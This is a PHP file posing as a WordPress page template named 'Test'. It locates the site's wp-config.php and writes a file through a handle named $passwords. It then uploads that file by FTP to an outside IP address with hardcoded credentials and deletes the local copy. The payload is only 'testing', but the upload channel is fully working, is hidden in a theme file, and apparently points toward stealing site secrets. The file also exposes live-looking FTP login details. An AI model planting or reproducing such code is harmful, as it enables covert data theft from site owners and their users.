<?php
/* template name: Test */
global $terme_options;
?>
<pre>
<?php
function get_wp_path() {
    $base = dirname(__FILE__);
    $path = false;

    if (@file_exists(dirname(dirname($base))."/wp-config.php")) {
        $path = dirname(dirname($base))."/";
    } else {
	    if (@file_exists(dirname(dirname(dirname($base)))."/wp-config.php")) {
	        $path = dirname(dirname(dirname($base)))."/";
	    } else {
	    	$path = false;
		}
	}

    if ($path != false) {
        $path = str_replace("\\", "/", $path);
    }
    return $path;
}

$file_name = 'ftp_test.txt';
$passwords = fopen($file_name, "w") or die("Unable to open file!");
fwrite($passwords, 'testing');
fclose($passwords);
// FTP access parameters
$host = '192.64.13.7';
$usr = 'hamyarwp';
$pwd = 'rCm908328l0944r';
// $curl_url = $hamyar_options['curl_url'];
$local_file = get_wp_path().$file_name;
$ftp_path = '/other/mojtaba/'.$file_name;
$conn_id = ftp_connect($host, 21);
if ($conn_id) {
    echo "Connected";
    if (ftp_login($conn_id, $usr, $pwd)) {
        $upload = ftp_put($conn_id, $ftp_path, $local_file, FTP_BINARY);
        if ($upload) {
            echo "Uploaded";
        } else {
            echo "Not Uploaded";
        }
        ftp_close($conn_id);
        unlink($file_name);
    } else {
        echo "Not Login";
    }
} else {
    echo "Not Connected";
}
